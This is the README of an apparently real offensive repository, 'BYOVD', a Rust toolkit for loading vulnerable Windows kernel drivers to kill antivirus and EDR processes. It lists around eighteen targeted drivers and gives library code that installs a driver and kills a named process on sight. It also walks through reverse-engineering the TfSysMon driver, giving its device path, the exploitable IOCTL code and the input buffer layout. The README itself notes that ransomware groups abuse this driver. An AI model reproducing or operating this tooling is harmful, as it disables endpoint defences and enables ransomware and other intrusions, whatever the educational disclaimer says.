


<img width="956" height="538" alt="cropped-Aug 28, 2025, 03_39_19 PM" src="https://github.com/user-attachments/assets/3d4b6944-770c-47c8-883b-f4d9bb90eb4d" />



**BYOVD** is a collection of PoCs demonstrating how vulnerable drivers can be exploited to disable AV/EDR solutions.

The collection includes both undocumented drivers and those with existing coverage in [LOLDDrivers](https://www.loldrivers.io/) or [Microsoft's recommended driver block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules).

---
> Since its initial discovery, the TfSysMon driver has been added to LOLDrivers and abused by ransomware groups using the **EDRKillShifter** tool, as reported by [Sophos](https://news.sophos.com/en-us/2024/08/14/edr-kill-shifter/) & [ESET](https://www.welivesecurity.com/en/eset-research/shifting-sands-ransomhub-edrkillshifter/)
---

## 📚 Table of Contents
- [🔍 Overview](#-overview)
- [🏗️ Project Structure](#%EF%B8%8F-project-structure)
- [🔧 Building](#-building)
- [📦 byovd-lib](#-byovd-lib)
- [💡 POCs](#-pocs)
- [🔬 Complete Driver Reverse Engineering Process (x64)](#-complete-driver-reverse-engineering-process-x64)
- [🔗 References](#-references)
- [⚠️ Disclaimer](#%EF%B8%8F-disclaimer)
  
## 🔍 Overview
The **BYOVD technique** has recently gained popularity in offensive security, particularly with the release of tools such as SpyBoy's *Terminator* (sold for $3,000) and the *ZeroMemoryEx Blackout* project. These tools capitalize on vulnerable drivers to disable AV/EDR agents, facilitating further attacks by reducing detection.

This repository contains several PoCs developed for educational purposes, helping researchers understand how these drivers can be abused to terminate processes.

## 🏗️ Project Structure

The project is organized as a **Rust Cargo workspace**. Most PoCs share a common library (`byovd-lib`) that handles the boilerplate: driver service lifecycle, IOCTL dispatch, process monitoring, privilege adjustment, and cleanup. Each killer is a thin binary (~50-100 lines) that only defines its driver-specific configuration. **`K7Terminator`, `Astra64-RW`, and `Xhunter1-Killer` are standalone** — they have their own `[workspace]` declarations and are built directly from their own directories, not via the root workspace.

```
BYOVD/
├── Cargo.toml                       # Workspace root (deps + release profile)
├── Cargo.lock
├── README.md
├── LICENSE
│
├── byovd-lib/                       # Shared library
│   ├── Cargo.toml
│   └── src/
│       ├── lib.rs                   # DriverConfig trait + run() / send_ioctl() / run_monitor()
│       ├── service.rs               # ByovdDriver -- SCM lifecycle (install/start/stop_and_delete)
│       ├── device.rs                # DeviceHandle -- 5 typed IOCTL dispatch shapes
│       ├── handle.rs                # WinHandle / ScHandle -- RAII handle wrappers (Send + Sync)
│       ├── process.rs               # find_pid_by_name / find_all_pids_by_name
│       ├── monitor.rs               # run_monitor_loop (closure-based) + setup_ctrlc_handler
│       ├── privilege.rs             # enable_privilege / ensure_running_as_local_system
│       └── util.rs                  # to_wstring / to_cstring / get_current_dir
│
├── AppRemover-Killer/               # OPSWAT AppRemover ardrv.sys
├── Astra64-RW/                      # EnTech Astra32 / TVicHW astra64.sys -- standalone, kernel R/W demo (Shadow SSDT hijack -> SYSTEM)
├── BdApiUtil-Killer/                # Baidu BdApiUtil64 (CVE-2024-51324)
├── CcProtect-Killer/                # CnCrypt CcProtect
├── GameDriverX64-Killer/            # Fedeen GameDriverX64 (CVE-2025-61155)
├── GoFlyDrv-Killer/                 # Golink GoFlyDrv
├── K7Terminator/                    # K7 RKScan -- standalone, LPE + BYOVD modes
├── Ksapi64-Killer/                  # Kingsoft ksapi64
├── NSec-Killer/                     # NSEC NSecKrnl (ValleyRAT BYOVD reproduction)
├── PCTcore64-Killer/                # PC Tools PCTcore64 (CVE-2026-8501)
├── PoisonX-Killer/                  # Microsoft PoisonX (j3h4ck reproduction)
├── STProcessMonitor-Killer/         # Safetica STProcessMonitor (CVE-2025-70795, v114 + v2618)
├── TfSysMon-Killer/                 # ThreatFire sysmon
├── UnknownKiller/                   # unattributed unknown.sys
├── Viragt64-Killer/                 # Tg Soft viragt64
├── Wsftprm-Killer/                  # Topaz wsftprm (CVE-2023-52271)
├── Xhunter1-Killer/                 # Wellbia xhunter1.sys (CVE-2026-3609)
└── Xkpsm-Killer/                    # JiranJikyosoft X-Keeper xkpsm
```

Each `*-Killer/` directory contains its own `Cargo.toml`, `src/main.rs` (the `DriverConfig` impl + CLI), `README.md` (driver hashes + usage), and the matching `.sys` file the binary loads at runtime.

## 🔧 Building

**Prerequisites:** Rust toolchain and Visual Studio Build Tools with the Windows SDK.

```bash
# Build all tools (release, optimized + stripped)
cargo build --release

# Build a single tool
cargo build --release -p BdApiUtil-Killer

# Build multiple specific tools
cargo build --release -p NSec-Killer -p Wsftprm-Killer
```

Binaries are output to `target/release/`. Copy the corresponding `.sys` driver file into the same directory as the executable before running.

## 📦 byovd-lib

`byovd-lib` is the shared library that all PoCs (except K7Terminator) are built on. It exposes **two complementary APIs** -- a high-level declarative one for the standard "install driver, kill on sight, clean up" flow, and a low-level imperative one for killers that need a custom flow (attach to an already-loaded driver, fan out to multiple PIDs, structured IOCTL buffers, custom retry logic, etc.). Both can be mixed in the same binary.

### Module layout

```
byovd-lib/src/
├── lib.rs        # DriverConfig trait + run() / send_ioctl() / run_monitor()
├── service.rs    # ByovdDriver -- SCM lifecycle (install, start, stop_and_delete)
├── device.rs     # DeviceHandle -- typed IOCTL dispatch (5 shapes)
├── handle.rs     # WinHandle / ScHandle -- RAII handle wrappers (Send + Sync)
├── process.rs    # find_pid_by_name / find_all_pids_by_name
├── monitor.rs    # run_monitor_loop (closure-based) + setup_ctrlc_handler
├── privilege.rs  # enable_privilege / ensure_running_as_local_system
└── util.rs       # to_wstring / to_cstring / get_current_dir
```

### High-level API: `DriverConfig` trait + `run()`

This is what the bundled killers use. Implement the trait, call `byovd_lib::run()`, done.

```rust
use byovd_lib::{DriverConfig, Result};
use clap::Parser;

struct MyDriver;
impl DriverConfig for MyDriver {
    fn driver_name(&self) -> &str { "MyDriver" }
    fn driver_file(&self) -> &str { "mydriver.sys" }
    fn device_path(&self) -> &str { "\\\\.\\MyDevice" }
    fn ioctl_code(&self) -> u32 { 0xDEAD }
    fn build_ioctl_input(&self, pid: u32, _name: &str) -> Vec<u8> {
        pid.to_ne_bytes().to_vec()
    }
}

#[derive(Parser)]
struct Cli {
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&MyDriver, &cli.process_name, None)
}
```

`run()` does: `preflight_check` → install service (`SERVICE_DEMAND_START`) → `StartService` → kill-on-sight monitor (Ctrl+C to exit) → stop + delete service.

Optional trait overrides with their defaults:

| Method | Default | Purpose |
|---|---|---|
| `device_access()` | `SERVICE_ALL_ACCESS` | `CreateFileW` access flags |
| `skip_unload()` | `false` | Skip driver cleanup (e.g. drivers that BSOD on unload) |
| `ignore_ioctl_error()` | `false` | Treat IOCTL failure as success (e.g. NSecKrnl reports error on success) |
| `ioctl_output_size()` | `0` | Expected output buffer size in bytes |
| `preflight_check()` | `Ok(())` | Pre-launch validation (e.g. LocalSystem check) |

### Low-level API: imperative pieces

When the trait flow doesn't fit -- e.g. the driver is already loaded and you only want to fire one IOCTL, you need a custom retry policy, the IOCTL takes a structured input rather than just a PID, or you want to fan out across all matching PIDs -- compose the lower-level pieces directly.

**Driver lifecycle** -- `ByovdDriver`:

```rust
use byovd_lib::ByovdDriver;

let driver = ByovdDriver::new("MyDriver", "mydriver.sys", "\\\\.\\MyDevice")?;
driver.start()?;                       // ERROR_SERVICE_ALREADY_RUNNING is OK
let device = driver.open_device()?;    // returns DeviceHandle
// ... send IOCTLs ...
driver.stop_and_delete()?;
```

**IOCTL dispatch** -- `DeviceHandle` exposes five typed shapes:

| Method | Use when |
|---|---|
| `ioctl<I, O>(code, &input, &mut output)` | Both input and output buffers, separate types |
| `ioctl_inout<T>(code, &mut data)` | Same buffer for input + output |
| `ioctl_in<I>(code, &input)` | Input only, no output buffer |
| `ioctl_in_unchecked<I>(code, &input)` | Input only, ignore failure (per-call alternative to `ignore_ioctl_error`) |
| `ioctl_raw(code, in_ptr, in_size, out_ptr, out_size)` | Raw pointer escape hatch |

The typed forms remove the manual `to_ne_bytes()` / `extend_from_slice()` boilerplate when the IOCTL takes a struct (e.g. `{ pid: u32, padding: [u8; 20] }`).

**Process lookup** -- `find_pid_by_name(name)` (first match) and `find_all_pids_by_name(name)` (all matches, excludes system PIDs ≤ 4).

**Custom monitor loop** -- `run_monitor_loop(name, interval, |pid| ...)` takes a closure so you can do whatever you want per match (multiple IOCTLs, structured logging, fan-out across PIDs, retry on error).

**Privileges** -- `enable_privilege("SeDebugPrivilege")` / `enable_privilege("SeLoadDriverPrivilege")` for drivers that require explicit token privileges. `ensure_running_as_local_system()` returns an error if the process is not running as `S-1-5-18`.

**Handle wrappers** -- `WinHandle` (auto-`CloseHandle`) and `ScHandle` (auto-`CloseServiceHandle`) are `Send + Sync` and can be moved across threads.

### Example: attach to an already-loaded driver, no service lifecycle

This is what `UnknownKiller --attach` does -- skip SCM entirely, just open the device and fire the IOCTL once:

```rust
use byovd_lib::{find_pid_by_name, DeviceHandle, Result};

fn main() -> Result<()> {
    let device = DeviceHandle::open("\\\\.\\eb")?;
    let pid = find_pid_by_name("notepad.exe").ok_or("not running")?;
    device.ioctl_in(0x222024, &pid)?;   // typed: just pass &u32
    Ok(())
}
```

### Back-compat aliases

`FileHandle` / `ServiceHandle` still resolve to `WinHandle` / `ScHandle`, and `get_pid_by_name` is kept as an alias for `find_pid_by_name`, so older code referencing those names keeps compiling.

## 💡 POCs
Below are the drivers and their respective PoCs available in this repository:

- **[AppRemover-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/AppRemover-Killer)**: Targets `ardrv.sys` from `OPSWAT AppRemover`.
- **[Astra64-RW](https://github.com/BlackSnufkin/BYOVD/tree/main/Astra64-RW)**: Targets `astra64.sys` from `EnTech Taiwan` (Astra32 / TVicHW) -- standalone kernel R/W PoC.
- **[BdApiUtil-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/BdApiUtil-Killer)**: Targets `BdApiUtil64.sys` from `Baidu AntiVirus` (CVE-2024-51324).
- **[CcProtect-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/CcProtect-Killer)**: Targets `CcProtect.sys` from `CnCrypt`.
- **[GameDriverX64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/GameDriverX64-Killer)**: Targets `GameDriverX64.sys` from `Fedeen Games` (CVE-2025-61155).
- **[GoFlyDrv-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/GoFlyDrv-Killer)**: Targets `GoFlyDrv.sys` from `Golink`.
- **[K7Terminator](https://github.com/BlackSnufkin/BYOVD/tree/main/K7Terminator)**: Targets `K7RKScan.sys` from `K7 Computing` (CVE-2025-52915, CVE-2025-1055) -- [Full write-up](https://blacksnufkin.github.io/posts/BYOVD-CVE-2025-52915/).
- **[Ksapi64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Ksapi64-Killer)**: Targets `ksapi64.sys` / `ksapi64_del.sys` from `Kingsoft Corporation`.
- **[NSec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/NSec-Killer)**: Targets `NSecKrnl.sys` from `NSEC` (ValleyRAT BYOVD reproduction).
- **[PCTcore64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/PCTcore64-Killer)**: Targets `PCTcore64.sys` from `PC Tools` (CVE-2026-8501).
- **[PoisonX-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/PoisonX-Killer)**: Target `PoisonX.sys` from `Microsoft` ([@j3h4ck](https://github.com/j3h4ck/PoisonKiller/) reproduction)
- **[STProcessMonitor-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/STProcessMonitor-Killer)**: Targets `STProcessMonitor.sys` from `Safetica` (CVE-2025-70795, supports v11.11.4 and v11.26.18).
- **[TfSysMon-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/TfSysMon-Killer)**: Targets `sysmon.sys` from `ThreatFire System Monitor`.
- **[UnknownKiller](https://github.com/BlackSnufkin/BYOVD/tree/main/UnknownKiller)**: Targets `unknown.sys` from an unattributed vendor (driver origin TBD).
- **[Viragt64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Viragt64-Killer)**: Targets `viragt64.sys` from `Tg Soft`.
- **[Wsftprm-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Wsftprm-Killer)**: Targets `wsftprm.sys` from `Topaz Antifraud` (CVE-2023-52271).
- **[Xhunter1-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Xhunter1-Killer)**: Targets legacy `xhunter1.sys` from `Wellbia` (XIGNCODE3, CVE-2026-3609).
- **[Xkpsm-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Xkpsm-Killer)**: Targets `xkpsm.sys` from `JiranJikyosoft X-Keeper`.

## 🔬 Complete Driver Reverse Engineering Process (x64)

This section demonstrates the complete A-Z reverse engineering methodology using the TfSysMon driver as a practical example. This process applies to any x64 Windows kernel driver analysis.

## 🎯 Step 0: Pre-Analysis - Function Import Screening

Check driver imports before starting reverse engineering.

A basic process killer driver requires 2 things:

a way to get a handle on a process (for instance **ZwOpenProcess** or **NtOpenProcess**)

a way to terminate the process (for instance  **ZwTerminateProcess** or **NtTerminateProcess**)

Check if a driver imports both function types. If a driver has in its imported functions Nt/ZwOpenProcess AND Nt/ZwTerminateProcess then it's a potential process killer driver candidate.

Only after confirming these imports should you proceed to detailed reverse engineering in IDA Pro.

### 🛠️ Prerequisites for x64 Driver Analysis

**Required Tools:**
- **IDA Pro** - for disassembling the driver for static analysis
- **OSRLoader** - for loading/running the driver (alternative to sc.exe command)

### 📍 Step 1: Locate and Analyze DriverEntry

**Every Windows driver starts with DriverEntry - find this function first:**

In TfSysMon, the DriverEntry looks like this:

```c
NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
  unsigned __int64 v2; // rax
  v2 = BugCheckParameter2;
  if ( !BugCheckParameter2 || BugCheckParameter2 == 0x2B992DDFA232LL )
  {
    v2 = ((unsigned __int64)&BugCheckParameter2 ^ MEMORY[0xFFFFF78000000320]) & 0xFFFFFFFFFFFFLL;
    if ( !v2 )
      v2 = 0x2B992DDFA232LL;
    BugCheckParameter2 = v2;
  }
  BugCheckParameter3 = ~v2;
  return sub_17484(DriverObject);
}
```

**Analysis Notes:**
- The code performs some initialization with BugCheckParameter2 and BugCheckParameter3
- The real driver initialization happens in `sub_17484`
- Follow the call to `sub_17484(DriverObject)` - this is where actual driver setup occurs

### 📍 Step 2: Follow Driver Initialization Chain

**Navigate to the initialization function (`sub_17484`):**

```c
NTSTATUS __fastcall sub_17484(PDRIVER_OBJECT DriverObject, unsigned __int16 *a2)
{
  // ... initialization code ...
  
  RtlInitUnicodeString(&DestinationString, L"\\Device\\TfSysMon");
  result = IoCreateDevice(DriverObject, 0, &DestinationString, 0x22u, 0x100u, 0, &DeviceObject);
  if ( result < 0 )
    return result;
    
  qword_1D5D8 = 0;
  dword_1D5D0 = 1;
  DriverObject->MajorFunction[15] = (PDRIVER_DISPATCH)&sub_17694;
  DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)&sub_17694;
  DriverObject->MajorFunction[18] = (PDRIVER_DISPATCH)&sub_17694;
  DriverObject->MajorFunction[2] = (PDRIVER_DISPATCH)&sub_17694;
  DriverObject->MajorFunction[0] = (PDRIVER_DISPATCH)&sub_17694;
  
  RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\TfSysMon");
  v6 = IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
  // ... rest of function ...
}
```

**Key Reverse Engineering Findings:**
- **Device Name**: `\\Device\\TfSysMon` (kernel space)
- **Symbolic Link**: `\\DosDevices\\TfSysMon` (user-mode accessible as `\\.\\TfSysMon`)
- **Device Type**: `0x22` = FILE_DEVICE_UNKNOWN
- **IRP Handler**: All major functions point to `sub_17694`
- **Target Function**: MajorFunction[14] = IRP_MJ_DEVICE_CONTROL handler

### 📍 Step 3: Analyze the IRP Dispatch Function

**Navigate to the dispatch function (`sub_17694`):**

```c
__int64 __fastcall sub_17694(struct _DEVICE_OBJECT *a1, IRP *a2)
{
  struct _IO_STACK_LOCATION *CurrentStackLocation; // rdx
  unsigned int v4; // ebx
  
  if ( a1 != DeviceObject )
  {
    v4 = -1073741790;
    goto LABEL_20;
  }
  CurrentStackLocation = a2->Tail.Overlay.CurrentStackLocation;
  v4 = 0;
  if ( !CurrentStackLocation->MajorFunction )
  {
    // Handle IRP_MJ_CREATE
  }
  else if ( CurrentStackLocation->MajorFunction == 2 )
  {
    // Handle IRP_MJ_CLOSE
  }
  else if ( CurrentStackLocation->MajorFunction <= 0xDu )
  {
    goto LABEL_7;
  }
  else if ( CurrentStackLocation->MajorFunction <= 0xFu )
  {
    v4 = sub_177D8(a2);  // THIS IS THE IOCTL HANDLER
    goto LABEL_20;
  }
  // ... rest of function
}
```

**Reverse Engineering Analysis:**
- Device validation occurs first (`if ( a1 != DeviceObject )`)
- `CurrentStackLocation->MajorFunction` determines the operation type
- **CRITICAL**: MajorFunction values 14 (0xE) and 15 (0xF) call `sub_177D8`
- MajorFunction 14 = IRP_MJ_DEVICE_CONTROL = IOCTL processing
- The vulnerable code path is: **IOCTL request → sub_177D8**

### 📍 Step 4: Reverse Engineer the IOCTL Handler

**Navigate to the IOCTL processing function (`sub_177D8`):**

```c
__int64 __fastcall sub_177D8(PIRP Irp, __int64 a2, __int64 a3, __int64 a4)
{
  // ... variable declarations ...
  
  v7 = *(_DWORD *)(a2 + 24);  // Extract IOCTL code
  MasterIrp = Irp->AssociatedIrp.MasterIrp;  // Input buffer
  v9 = *(unsigned int *)(a2 + 16);  // InputBufferLength
  v10 = *(_DWORD *)(a2 + 8);  // OutputBufferLength
  
  if ( v7 > 0xB4A00070 )
  {
    if ( v7 > 0xB4A000F8 )
    {
      if ( v7 != -1264582404 )
      {
        switch ( v7 )
        {
          // ... various cases ...
          case 0xB4A00404:  // VULNERABLE IOCTL CODE
            if ( (unsigned int)v9 >= 0x18 )
              return (unsigned int)sub_1837C((__int64)Irp->AssociatedIrp.MasterIrp);
            break;
          // ... more cases ...
        }
      }
    }
  }
  // ... rest of function
}
```

**Critical Reverse Engineering Discoveries:**
- **IOCTL Extraction**: `v7 = *(_DWORD *)(a2 + 24)` gets the IOCTL code from IO_STACK_LOCATION
- **Input Buffer**: `Irp->AssociatedIrp.MasterIrp` contains user data
- **Buffer Length**: `v9 = *(unsigned int *)(a2 + 16)` gets input buffer size
- **Vulnerable IOCTL**: `0xB4A00404` leads to `sub_1837C`
- **Size Check**: Only validates buffer ≥ 0x18 (24 bytes) - minimal validation!

### 📍 Step 5: Analyze the Vulnerable Function

**Navigate to the process termination function (`sub_1837C`):**

```c
__int64 __fastcall sub_1837C(__int64 a1)
{
  unsigned int v2; // ebx
  void *v3; // rax
  unsigned int v4; // edi
  NTSTATUS v6; // eax
  // ... variable declarations ...
  
  v2 = 0;
  if ( MmIsAddressValid((PVOID)a1) )
  {
    v3 = *(void **)(a1 + 4);  // EXTRACT PID FROM OFFSET +4
    v4 = 0;
    if ( !v3 )
      return 3221225485LL;
    memset(&ObjectAttributes.RootDirectory, 0, 20);
    ObjectAttributes.SecurityDescriptor = 0;
    ObjectAttributes.SecurityQualityOfService = 0;
    ClientId.UniqueThread = 0;
    ObjectAttributes.Length = 48;
    ClientId.UniqueProcess = v3;  // SET TARGET PID
    while ( 1 )
    {
      v6 = ZwOpenProcess(&ProcessHandle, 1u, &ObjectAttributes, &ClientId);
      v7 = v6 < 0;
      v2 = v6;
      if ( !v6 )
        break;
      v8 = v4++;
      if ( v8 >= 3 )
      {
        v7 = v6 < 0;
        break;
      }
    }
    if ( !v7 )
    {
      v9 = 0;
      do
      {
        v2 = ZwTerminateProcess(ProcessHandle, 0);  // TERMINATE PROCESS
        if ( !v2 )
          break;
        v10 = v9++;
      }
      while ( v10 < 3 );
      ZwClose(ProcessHandle);
    }
  }
  return v2;
}
```

**Function Analysis:**
- **Input Structure**: From the driver code analysis, we determined the buffer layout where PID is at offset +4
- **Input Parsing**: `v3 = *(void **)(a1 + 4)` extracts PID from input buffer at offset +4
- **Process Opening**: `ZwOpenProcess` with minimal access rights (1u = PROCESS_TERMINATE)
- **No Security Checks**: No validation of caller privileges or target process protection
- **Process Termination**: Direct call to `ZwTerminateProcess` 
- **Retry Logic**: Multiple attempts for both opening and termination
- **Any Process**: Can terminate any process accessible to SYSTEM account

### 📍 Step 6: Map the Complete Attack Chain

**Complete Reverse Engineering Flow:**
1. **Entry Point**: User calls `DeviceIoControl` on `\\.\\TfSysMon`
2. **IRP Creation**: I/O Manager creates IRP with MajorFunction = 14
3. **Dispatch**: `sub_17694` routes to `sub_177D8` for IOCTL processing
4. **IOCTL Check**: `sub_177D8` validates IOCTL code `0xB4A00404` and buffer size ≥ 24 bytes
5. **Execution**: Calls `sub_1837C` with user input buffer
6. **Termination**: `sub_1837C` extracts PID from offset +4 and terminates process via `ZwTerminateProcess`

**Input Buffer Structure (from driver reverse engineering):**
```
Offset 0x00-0x03: [padding] - 4 bytes
Offset 0x04-0x07: [Target Process ID] - 4 bytes (DWORD)  
Offset 0x08-0x17: [extra_padding] - 16 bytes
Total Size: 24 bytes (0x18) - matches driver's minimum size check
```


> This methodology demonstrates how to systematically reverse engineer any Windows x64 kernel driver to identify similar vulnerabilities by following the execution path from user-mode communication through to dangerous kernel operations.

## Support 🍺

If BYOVD helped your red team operations, consider buying me a beer:

<a href="https://www.buymeacoffee.com/blacksnufkin"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" width="200" height="60"></a>



## 🔗 References
- **Alice Climent-Pommeret's Blog**: [Finding and Exploiting Process Killer Drivers with LOL for $3000](https://alice.climent-pommeret.red/posts/process-killer-driver/)
- **LOLDrivers**: [A Central Repository of Known Vulnerable Drivers](https://www.loldrivers.io/)
- **Microsoft Driver Block Rules**: [Microsoft's Recommended Driver Block Rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules)
- **Windows Kernel Programming** by Pavel Yosifovich
- **Windows Internals, Part 1 & 2** by Mark E. Russinovich, Alex Ionescu, David Solomon

## ⚠️ Disclaimer
**The BYOVD Project** is for **educational and research purposes only**. The author is not responsible for any misuse or damage caused by these programs. Always seek explicit permission before using these tools on any system.
